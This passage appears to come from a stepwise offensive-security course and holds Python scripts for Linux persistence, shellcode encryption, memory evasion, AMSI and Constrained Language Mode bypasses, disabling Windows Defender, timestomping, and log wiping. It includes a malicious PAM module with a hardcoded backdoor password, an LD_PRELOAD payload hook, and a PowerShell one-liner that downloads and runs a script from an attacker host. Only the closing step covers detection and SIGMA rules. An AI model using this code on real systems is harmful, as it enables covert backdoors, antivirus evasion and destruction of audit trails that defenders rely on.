        
        commands = [
            f'cp {self.payload_path} /usr/local/bin/syshealth',
            'cat > /etc/systemd/system/syshealth.service << EOF\n' + service_content + 'EOF',
            'systemctl daemon-reload',
            'systemctl enable syshealth.service',
            'systemctl start syshealth.service'
        ]
        
        return {
            "technique": "Systemd Service",
            "service_file": service_content,
            "timer_file": timer_content,
            "commands": commands
        }
    
    def ssh_persistence(self, public_key: str) -> Dict:
        """SSH authorized key persistence"""
        commands = [
            f'mkdir -p ~/.ssh && chmod 700 ~/.ssh',
            f'echo "{public_key}" >> ~/.ssh/authorized_keys',
            f'chmod 600 ~/.ssh/authorized_keys',
            # Hide the key by appending to existing
            f'echo "{public_key}" | tee -a /root/.ssh/authorized_keys /home/*/.ssh/authorized_keys 2>/dev/null',
        ]
        
        # System-wide persistence
        sshd_config_mod = [
            'echo "AuthorizedKeysFile /etc/ssh/auth_keys" >> /etc/ssh/sshd_config',
            f'echo "{public_key}" > /etc/ssh/auth_keys',
            'chmod 644 /etc/ssh/auth_keys',
        ]
        
        return {
            "technique": "SSH Key Persistence",
            "user_commands": commands,
            "system_commands": sshd_config_mod
        }
    
    def bashrc_persistence(self) -> Dict:
        """Shell profile persistence"""
        payload_line = f'(nohup {self.payload_path} &>/dev/null &)'
        
        files = [
            "~/.bashrc",
            "~/.bash_profile",
            "~/.profile",
            "/etc/bash.bashrc",
            "/etc/profile",
            "/etc/profile.d/sysupdate.sh"
        ]
        
        commands = [f'echo "{payload_line}" >> {f}' for f in files]
        return {"technique": "Shell Profile", "files": files, "commands": commands}
    
    def ld_preload_persistence(self, payload_so: str) -> Dict:
        """LD_PRELOAD persistence via /etc/ld.so.preload"""
        commands = [
            f'echo "{payload_so}" > /etc/ld.so.preload',
            f'chmod 644 /etc/ld.so.preload',
        ]
        
        hooking_code = '''// LD_PRELOAD hook example - hook read() system call
#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>

ssize_t read(int fd, void* buf, size_t count) {
    // Execute payload on first call
    static int executed = 0;
    if (!executed) {
        executed = 1;
        system("/tmp/.payload &");
    }
    // Call real read
    ssize_t (*real_read)(int, void*, size_t) = dlsym(RTLD_NEXT, "read");
    return real_read(fd, buf, count);
}
'''
        return {
            "technique": "LD_PRELOAD",
            "commands": commands,
            "hooking_code": hooking_code
        }
    
    def pam_backdoor(self) -> Dict:
        """PAM module backdoor"""
        pam_code = '''// Malicious PAM module
#include <security/pam_modules.h>
#include <string.h>
#define BACKDOOR_PASS "h4ck3r_backdoor_2024"

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *password;
    pam_get_authtok(pamh, PAM_AUTHTOK, &password, NULL);
    
    // Backdoor password always authenticates
    if (strcmp(password, BACKDOOR_PASS) == 0) {
        return PAM_SUCCESS;
    }
    
    return PAM_AUTH_ERR;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
'''
        install_cmds = [
            'gcc -shared -fPIC -o /lib/security/pam_update.so pam_backdoor.c -lpam',
            'echo "auth sufficient pam_update.so" >> /etc/pam.d/common-auth',
        ]
        return {
            "technique": "PAM Backdoor",
            "source_code": pam_code,
            "install": install_cmds
        }


if __name__ == '__main__':
    persist = LinuxPersistence("/tmp/.sysmonitor")
    print(f"[+] Available Linux persistence techniques: {len(persist.PERSISTENCE_METHODS)}")
    
    cron = persist.cron_persistence()
    print(f"[+] Cron methods: {list(cron['methods'].keys())}")
    
    systemd = persist.systemd_persistence()
    print(f"[+] Systemd service created: syshealth.service")
```

## Step 717: Memory Evasion & Shellcode Encryption

```python
#!/usr/bin/env python3
# Memory evasion and shellcode encryption techniques

import os
import struct
from dataclasses import dataclass
from typing import List, Dict, Tuple

@dataclass
class ShellcodeEncryption:
    """Shellcode encryption and encoding for AV evasion"""
    
    def xor_encrypt(self, shellcode: bytes, key: bytes) -> Tuple[bytes, str]:
        """XOR encrypt shellcode"""
        encrypted = bytes([b ^ key[i % len(key)] for i, b in enumerate(shellcode)])
        
        decryptor_c = f'''// XOR Decryptor
void decrypt_shellcode(unsigned char* sc, int len) {{
    unsigned char key[] = {{{", ".join([str(b) for b in key])}}};
    for (int i = 0; i < len; i++) {{
        sc[i] ^= key[i % {len(key)}];
    }}
}}
'''
        return encrypted, decryptor_c
    
    def aes_encrypt_shellcode(self, shellcode: bytes, key: bytes = None) -> Dict:
        """AES-256 encrypt shellcode"""
        import hashlib
        
        if key is None:
            key = os.urandom(32)
        iv = os.urandom(16)
        
        # Python implementation using pycryptodome
        py_encrypt = f'''from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import base64

key = {list(key)}
iv = {list(iv)}
shellcode = bytes([/* shellcode bytes */])

cipher = AES.new(bytes(key), AES.MODE_CBC, bytes(iv))
encrypted = cipher.encrypt(pad(shellcode, AES.block_size))
print("Encrypted:", base64.b64encode(encrypted).decode())
'''
        
        # C decryptor
        c_decrypt = f'''// AES-256-CBC Decryptor (using Windows CNG)
#include <windows.h>
#include <bcrypt.h>
#pragma comment(lib, "bcrypt.lib")

void* decrypt_aes(unsigned char* enc, DWORD enc_len, unsigned char* key, unsigned char* iv) {{
    BCRYPT_ALG_HANDLE hAlgo;
    BCRYPT_KEY_HANDLE hKey;
    PBYTE keyObj;
    DWORD keyObjLen, dataLen, result;
    
    BCryptOpenAlgorithmProvider(&hAlgo, BCRYPT_AES_ALGORITHM, NULL, 0);
    BCryptSetProperty(hAlgo, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    BCryptGetProperty(hAlgo, BCRYPT_OBJECT_LENGTH, (PBYTE)&keyObjLen, sizeof(DWORD), &result, 0);
    keyObj = (PBYTE)HeapAlloc(GetProcessHeap(), 0, keyObjLen);
    BCryptGenerateSymmetricKey(hAlgo, &hKey, keyObj, keyObjLen, key, 32, 0);
    
    BCryptGetProperty(hAlgo, BCRYPT_BLOCK_LENGTH, (PBYTE)&dataLen, sizeof(DWORD), &result, 0);
    PBYTE plaintext = (PBYTE)VirtualAlloc(NULL, enc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    BCryptDecrypt(hKey, enc, enc_len, NULL, iv, 16, plaintext, enc_len, &dataLen, BCRYPT_BLOCK_PADDING);
    
    return plaintext;
}}
'''
        return {
            "key": key.hex(),
            "iv": iv.hex(),
            "python_encryptor": py_encrypt,
            "c_decryptor": c_decrypt
        }
    
    def rc4_encrypt(self, shellcode: bytes, key: bytes) -> Tuple[bytes, str]:
        """RC4 encrypt shellcode (simple key scheduling)"""
        # RC4 KSA
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # RC4 PRGA
        encrypted = []
        i = j = 0
        for byte in shellcode:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            encrypted.append(byte ^ S[(S[i] + S[j]) % 256])
        
        c_decryptor = f'''// RC4 Decryptor
void rc4_decrypt(unsigned char* data, int data_len, unsigned char* key, int key_len) {{
    unsigned char S[256];
    int i, j = 0;
    for (i = 0; i < 256; i++) S[i] = i;
    for (i = 0; i < 256; i++) {{
        j = (j + S[i] + key[i % key_len]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
    }}
    i = j = 0;
    for (int k = 0; k < data_len; k++) {{
        i = (i + 1) % 256; j = (j + S[i]) % 256;
        unsigned char tmp = S[i]; S[i] = S[j]; S[j] = tmp;
        data[k] ^= S[(S[i] + S[j]) % 256];
    }}
}}
'''
        return bytes(encrypted), c_decryptor


@dataclass
class MemoryEvasion:
    """Memory evasion techniques"""
    
    def heap_spray_shellcode(self) -> str:
        """Heap spray technique to hide shellcode"""
        c_code = '''// Heap spray - allocate shellcode in multiple heap locations
void heap_spray_execute(unsigned char* shellcode, SIZE_T sc_len) {
    HANDLE heaps[32];
    DWORD numHeaps;
    
    // Get all process heaps
    numHeaps = GetProcessHeaps(32, heaps);
    
    for (DWORD i = 0; i < numHeaps; i++) {
        // Allocate in each heap
        LPVOID mem = HeapAlloc(heaps[i], 0, sc_len);
        if (mem) {
            memcpy(mem, shellcode, sc_len);
        }
    }
    
    // Execute from private VirtualAlloc (not heap - harder to detect)
    LPVOID exec_mem = VirtualAlloc(NULL, sc_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec_mem, shellcode, sc_len);
    ((void(*)())exec_mem)();
}
'''
        return c_code
    
    def module_stomping(self) -> str:
        """Module stomping - overwrite legitimate module memory"""
        c_code = '''// Module Stomping
// Load a legitimate DLL, then overwrite with shellcode
#include <windows.h>

void module_stomp(unsigned char* shellcode, SIZE_T sc_len) {
    // Load a rarely-used legitimate DLL
    HMODULE hModule = LoadLibraryA("xolehlp.dll");
    
    // Get .text section start
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);
    
    LPVOID textSection = (LPVOID)((BYTE*)hModule + pSection->VirtualAddress);
    
    // Change protection
    DWORD oldProt;
    VirtualProtect(textSection, sc_len, PAGE_EXECUTE_READWRITE, &oldProt);
    
    // Overwrite with shellcode
    memcpy(textSection, shellcode, sc_len);
    
    // Execute
    ((void(*)())textSection)();
    
    // Restore protection
    VirtualProtect(textSection, sc_len, oldProt, &oldProt);
}
'''
        return c_code


if __name__ == '__main__':
    enc = ShellcodeEncryption()
    
    # Test shellcode (NOP sled)
    test_sc = bytes([0x90] * 100)
    
    # XOR encrypt
    encrypted, decryptor = enc.xor_encrypt(test_sc, b"\xAB\xCD\xEF")
    print(f"[+] XOR encrypted: {encrypted[:20].hex()}...")
    
    # RC4 encrypt
    rc4_enc, rc4_dec = enc.rc4_encrypt(test_sc, b"secretkey")
    print(f"[+] RC4 encrypted: {rc4_enc[:20].hex()}...")
    
    # AES encrypt
    aes_result = enc.aes_encrypt_shellcode(test_sc)
    print(f"[+] AES key: {aes_result['key'][:32]}...")
```

## Step 718: AMSI Bypass Techniques

```python
#!/usr/bin/env python3
# AMSI (Antimalware Scan Interface) bypass techniques

from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class AMSIBypass:
    """AMSI bypass techniques for PowerShell and .NET"""
    
    # AMSI bypass one-liners (obfuscated to demonstrate techniques)
    BYPASS_ONELINES = [
        # Reflection-based bypass
        '[Ref].Assembly.GetType(\"System.Management.Automation.AmsiUtils\").GetField(\"amsiInitFailed\",\"NonPublic,Static\").SetValue($null,$true)',
        # Memory patching
        '$Win32 = @"\n[DllImport(\"kernel32\")]\npublic static extern IntPtr GetProcAddress(IntPtr hModule, string procName);\n"@',
    ]
    
    def amsi_patch_powershell(self) -> Dict:
        """PowerShell AMSI bypass via memory patching"""
        # Classic AMSI bypass (patching amsiContext)
        ps_bypass1 = '''# AMSI Bypass - Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
$MethodDefinition = @"
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name "Kernel32" -Namespace "Win32" -PassThru

$amsiDLL = [Win32.Kernel32]::LoadLibrary("amsi.dll")
$ASBAddr = [Win32.Kernel32]::GetProcAddress($amsiDLL, "AmsiScanBuffer")

# Patch with ret 0 (xor eax,eax; ret)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)  # mov eax,0x80070057; ret
$OldProtect = 0
[Win32.Kernel32]::VirtualProtect($ASBAddr, [UIntPtr]5, 0x40, [ref]$OldProtect)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $ASBAddr, 6)
[Win32.Kernel32]::VirtualProtect($ASBAddr, [UIntPtr]5, $OldProtect, [ref]$OldProtect)
'''
        
        # COM-based bypass
        ps_bypass2 = '''# AMSI Bypass via COM (Windows Defender)
$a=[Ref].Assembly.GetTypes() | ForEach-Object {$_.GetFields('NonPublic,Static') | Where-Object {$_.Name -like "*Context*"}} | Select-Object -First 1
$a.SetValue($null, [IntPtr]0)
'''
        
        # .NET reflection bypass
        ps_bypass3 = '''# AMSI Bypass via .NET Reflection
$amsiAssembly = [System.AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split("\\")[-1].Equals("System.Management.Automation.dll") }
$type = $amsiAssembly.GetType("System.Management.Automation.AmsiUtils")
$field = $type.GetField("amsiInitFailed","NonPublic,Static")
$field.SetValue($null,$true)
'''
        
        return {
            "technique": "AMSI Bypass",
            "methods": {
                "memory_patch": ps_bypass1,
                "com_bypass": ps_bypass2,
                "reflection": ps_bypass3
            }
        }
    
    def clm_bypass(self) -> Dict:
        """Constrained Language Mode bypass techniques"""
        methods = {
            "runspace_bypass": '''# CLM bypass via custom runspace
$rs = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [System.Management.Automation.PowerShell]::Create()
$ps.Runspace = $rs
$ps.AddScript("[System.Diagnostics.Process]::GetCurrentProcess().StartInfo.UseShellExecute")
$ps.Invoke()''',
            
            "powershell_v2": 'powershell -version 2 -command "IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/payload.ps1\')"',
            
            "dotnet_bypass": '''# CLM bypass via .NET directly
[System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms")
$code = @"
  using System;
  using System.Diagnostics;
  public class Bypass {
    public static void Run() {
      Process.Start("cmd.exe");
    }
  }
"@
[System.Reflection.Assembly]::LoadWithPartialName("Microsoft.CSharp")
$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.GenerateInMemory = $true
$result = $compiler.CompileAssemblyFromSource($params, $code)
$result.CompiledAssembly.GetType("Bypass")::Run()'''
        }
        return {"technique": "CLM Bypass", "methods": methods}
    
    def defender_exclusion(self) -> Dict:
        """Windows Defender exclusion techniques"""
        ps_commands = [
            # Add exclusion paths
            'Add-MpPreference -ExclusionPath "C:\\Windows\\Temp"',
            'Add-MpPreference -ExclusionPath "C:\\Users\\Public"',
            # Exclude process
            'Add-MpPreference -ExclusionProcess "powershell.exe"',
            # Disable real-time monitoring
            'Set-MpPreference -DisableRealtimeMonitoring $true',
            # Disable behavior monitoring
            'Set-MpPreference -DisableBehaviorMonitoring $true',
            # Disable script scanning
            'Set-MpPreference -DisableScriptScanning $true',
        ]
        
        # Registry-based disable
        reg_commands = [
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
            'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f',
        ]
        
        return {
            "technique": "Defender Exclusion/Disable",
            "powershell": ps_commands,
            "registry": reg_commands,
            "note": "Requires admin privileges"
        }


if __name__ == '__main__':
    amsi = AMSIBypass()
    
    bypass_methods = amsi.amsi_patch_powershell()
    print(f"[+] AMSI bypass methods: {list(bypass_methods['methods'].keys())}")
    
    clm = amsi.clm_bypass()
    print(f"[+] CLM bypass techniques: {list(clm['methods'].keys())}")
    
    defender = amsi.defender_exclusion()
    print(f"[+] Defender exclusion commands: {len(defender['powershell'])}")
```

## Step 719: Timestomping & Anti-Forensics

```python
#!/usr/bin/env python3
# Timestomping and anti-forensics techniques

import os
import stat
import time
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class Timestomping:
    """File timestamp manipulation"""
    
    def linux_stomp_timestamps(self, target_file: str, reference_file: str = None) -> Dict:
        """Linux timestomping using touch and Python"""
        # Copy timestamps from reference file
        commands = {
            "touch_reference": f'touch -r /etc/hosts "{target_file}"',
            "specific_time": f'touch -t 202201010000.00 "{target_file}"',
            "access_modify": f'touch -a -m -t 202201010000.00 "{target_file}"',
        }
        
        # Python-based approach (harder to detect)
        py_stomp = f'''import os, time
from datetime import datetime

def stomp_timestamps(filepath, ref_filepath=None):
    if ref_filepath:
        ref_stat = os.stat(ref_filepath)
        atime = ref_stat.st_atime
        mtime = ref_stat.st_mtime
    else:
        # Use Windows epoch-like timestamp
        dt = datetime(2022, 1, 1, 0, 0, 0)
        atime = mtime = dt.timestamp()
    
    os.utime(filepath, (atime, mtime))
    print(f"Timestamps changed for {{filepath}}")

stomp_timestamps("{target_file}"{f", '{reference_file}'" if reference_file else ""})
'''
        return {"commands": commands, "python": py_stomp}
    
    def windows_stomp(self) -> str:
        """Windows timestomping using PowerShell or C"""
        ps_stomp = '''# PowerShell timestomping
function Set-Timestamps {
    param($Path, $CreationTime, $LastWriteTime, $LastAccessTime)
    
    $item = Get-Item $Path -Force
    $item.CreationTime = $CreationTime
    $item.LastWriteTime = $LastWriteTime
    $item.LastAccessTime = $LastAccessTime
}

# Set all timestamps to old date to evade detection
Set-Timestamps -Path "C:\\Windows\\Temp\\payload.exe" `
    -CreationTime "2020-01-01 10:00:00" `
    -LastWriteTime "2020-01-01 10:00:00" `
    -LastAccessTime "2020-01-01 10:00:00"

# Copy timestamps from legitimate file
$ref = Get-Item "C:\\Windows\\System32\\notepad.exe"
$target = Get-Item "C:\\Windows\\Temp\\payload.exe" -Force
$target.CreationTime = $ref.CreationTime
$target.LastWriteTime = $ref.LastWriteTime
$target.LastAccessTime = $ref.LastAccessTime
'''
        return ps_stomp


@dataclass
class AntiForensics:
    """Anti-forensics techniques"""
    
    def clear_linux_logs(self) -> Dict:
        """Linux log clearing and manipulation"""
        commands = {
            "bash_history": [
                'export HISTSIZE=0',
                'unset HISTFILE',
                'history -c && history -w',
                'cat /dev/null > ~/.bash_history',
                'ln -sf /dev/null ~/.bash_history',
            ],
            "system_logs": [
                'cat /dev/null > /var/log/auth.log',
                'cat /dev/null > /var/log/syslog',
                'cat /dev/null > /var/log/messages',
                'journalctl --rotate && journalctl --vacuum-time=1s',
                # Selective deletion (remove specific IP from logs)
                'sed -i "/192.168.1.100/d" /var/log/auth.log',
            ],
            "wtmp_utmp": [
                # Clear login records
                'cat /dev/null > /var/log/wtmp',
                'cat /dev/null > /var/run/utmp',
                # Use utmpdump to selectively edit
                'utmpdump /var/log/wtmp > /tmp/wtmp.txt',
                'grep -v "attacker" /tmp/wtmp.txt | utmpdump -r > /var/log/wtmp',
            ]
        }
        return {"technique": "Log Clearing", "commands": commands}
    
    def clear_windows_logs(self) -> Dict:
        """Windows event log clearing"""
        commands = {
            "wevtutil": [
                'wevtutil cl Security',
                'wevtutil cl System',
                'wevtutil cl Application',
                'for /F "tokens=*" %1 in (\'wevtutil.exe el\') do wevtutil.exe cl "%1"',
            ],
            "powershell": [
                'Get-EventLog -LogName * | ForEach-Object { Clear-EventLog $_.Log }',
                'wevtutil el | Foreach-Object {wevtutil cl "$_"}',
            ],
            "selective": [
                # Delete specific event IDs
                'wevtutil qe Security /q:"*[System[EventID=4624]]" /f:text | head',
                # PowerShell selective deletion
                'Get-WinEvent -LogName Security | Where-Object {$_.Id -eq 4624} | ForEach-Object {$_.Message}',
            ]
        }
        return {"technique": "Windows Log Clearing", "commands": commands}
    
    def secure_delete_files(self) -> Dict:
        """Securely delete files to prevent recovery"""
        linux_cmds = [
            'shred -vzu -n 5 /path/to/file',  # Overwrite 5 times then delete
            'wipe -f /path/to/file',
            'srm -rf /path/to/directory',
            'dd if=/dev/urandom of=/path/to/file bs=1M count=10 && rm /path/to/file',
        ]
        
        windows_cmds = [
            'cipher /w:C:\\path\\to\\directory',  # Overwrite free space
            'sdelete64.exe -p 5 C:\\path\\to\\file',  # SDelete from Sysinternals
        ]
        
        return {
            "technique": "Secure File Deletion",
            "linux": linux_cmds,
            "windows": windows_cmds
        }


if __name__ == '__main__':
    stomp = Timestomping()
    result = stomp.linux_stomp_timestamps("/tmp/payload", "/etc/hosts")
    print(f"[+] Linux timestomp commands: {list(result['commands'].keys())}")
    
    af = AntiForensics()
    logs = af.clear_linux_logs()
    print(f"[+] Log clearing categories: {list(logs['commands'].keys())}")
    
    win_logs = af.clear_windows_logs()
    print(f"[+] Windows log clearing methods: {list(win_logs['commands'].keys())}")
```

## Step 720: Defense Evasion Detection & Hardening

```python
#!/usr/bin/env python3
# Detection and hardening against persistence and evasion techniques

import os
import subprocess
import json
from dataclasses import dataclass, field
from typing import List, Dict

@dataclass
class PersistenceDetector:
    """Detect persistence mechanisms"""
    
    def check_registry_persistence(self) -> List[Dict]:
        """Check common registry persistence locations (Windows)"""
        run_keys = [
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce",
            r"HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce",
        ]
        
        ps_check = '''
# Check all registry persistence locations
$runKeys = @(
    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
    "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce",
    "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce"
)

foreach ($key in $runKeys) {
    $values = Get-ItemProperty -Path $key -ErrorAction SilentlyContinue
    if ($values) {
        $values.PSObject.Properties | Where-Object {$_.Name -notmatch "^PS"} | ForEach-Object {
            [PSCustomObject]@{
                Key = $key
                Name = $_.Name
                Value = $_.Value
                Suspicious = ($_.Value -match "temp|appdata|public|roaming" -or $_.Value -match "\.tmp|\.vbs|\.ps1")
            }
        }
    }
}
'''
        
        return [{"check": "Registry Run Keys", "powershell": ps_check, "keys": run_keys}]
    
    def check_scheduled_tasks(self) -> Dict:
        """Check for suspicious scheduled tasks"""
        ps_check = '''
# Check suspicious scheduled tasks
Get-ScheduledTask | Where-Object {
    $_.State -ne "Disabled"
} | ForEach-Object {
    $task = $_
    $actions = $task.Actions
    foreach ($action in $actions) {
        if ($action.Execute -match "temp|appdata|public|roaming" -or
            $action.Execute -match "\.tmp|\.vbs|\.ps1|\.bat") {
            [PSCustomObject]@{
                TaskName = $task.TaskName
                TaskPath = $task.TaskPath
                Execute = $action.Execute
                Arguments = $action.Arguments
                State = $task.State
                Author = $task.Author
            }
        }
    }
} | Format-Table -AutoSize
'''
        return {"check": "Scheduled Tasks", "powershell": ps_check}
    
    def check_wmi_subscriptions(self) -> Dict:
        """Check for WMI event subscriptions"""
        ps_check = '''
# Check WMI event subscriptions
Write-Host "=== Event Filters ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root/subscription -ClassName __EventFilter | Select-Object Name, Query

Write-Host "\n=== Event Consumers ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root/subscription -ClassName CommandLineEventConsumer | Select-Object Name, CommandLineTemplate

Write-Host "\n=== Bindings ===" -ForegroundColor Yellow
Get-CimInstance -Namespace root/subscription -ClassName __FilterToConsumerBinding
'''
        return {"check": "WMI Subscriptions", "powershell": ps_check}
    
    def check_linux_persistence(self) -> Dict:
        """Check Linux persistence mechanisms"""
        checks = {
            "crontabs": [
                'for user in $(cut -d: -f1 /etc/passwd); do crontab -u $user -l 2>/dev/null; done',
                'ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/',
                'cat /etc/crontab',
            ],
            "systemd": [
                'find /etc/systemd /usr/lib/systemd -name "*.service" -newer /etc/systemd/system/multi-user.target -ls',
                'systemctl list-units --type=service --state=running',
            ],
            "ssh_keys": [
                'find / -name "authorized_keys" 2>/dev/null -exec cat {} \\;',
                'ls -la ~/.ssh/',
            ],
            "bashrc": [
                'for user in $(cut -d: -f6 /etc/passwd); do cat "$user/.bashrc" 2>/dev/null; done',
                'cat /etc/profile /etc/bash.bashrc',
            ],
            "ld_preload": [
                'cat /etc/ld.so.preload 2>/dev/null',
                'env | grep LD_PRELOAD',
            ]
        }
        return {"check": "Linux Persistence", "commands": checks}


@dataclass
class SIGMADetectionRules:
    """SIGMA rules for detecting persistence and evasion"""
    
    def registry_persistence_sigma(self) -> str:
        return '''
title: Registry Run Key Persistence
status: stable
description: Detects addition of registry run keys for persistence
author: Security Team
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        EventType: SetValue
        TargetObject|contains:
            - '\\CurrentVersion\\Run\\'
            - '\\CurrentVersion\\RunOnce\\'
    filter_legitimate:
        Details|contains:
            - 'OneDrive.exe'
            - 'MicrosoftEdge.exe'
    condition: selection and not filter_legitimate
falsepositives:
    - Legitimate software installation
level: medium
tags:
    - attack.persistence
    - attack.t1547.001
'''
    
    def process_injection_sigma(self) -> str:
        return '''
title: Suspicious Process Injection via WriteProcessMemory
status: experimental
description: Detects potential process injection
author: Security Team
logsource:
    category: process_creation
    product: windows
detection:
    selection_api:
        CommandLine|contains:
            - 'WriteProcessMemory'
            - 'VirtualAllocEx'
            - 'CreateRemoteThread'
    selection_powershell:
        Image|endswith: '\\powershell.exe'
        CommandLine|contains:
            - 'OpenProcess'
            - 'VirtualAlloc'
    condition: selection_api or selection_powershell
level: high
tags:
    - attack.defense_evasion
    - attack.t1055
'''


if __name__ == '__main__':
    detector = PersistenceDetector()
    
    print("[+] Checking persistence mechanisms:")
    reg_checks = detector.check_registry_persistence()
    print(f"    Registry run keys to check: {len(reg_checks[0]['keys'])}")
    
    linux_checks = detector.check_linux_persistence()
    print(f"    Linux persistence check categories: {list(linux_checks['commands'].keys())}")
    
    sigma = SIGMADetectionRules()
    print(f"\n[+] SIGMA rule for Registry Persistence:")
    print(sigma.registry_persistence_sigma()[:200] + "...")
```
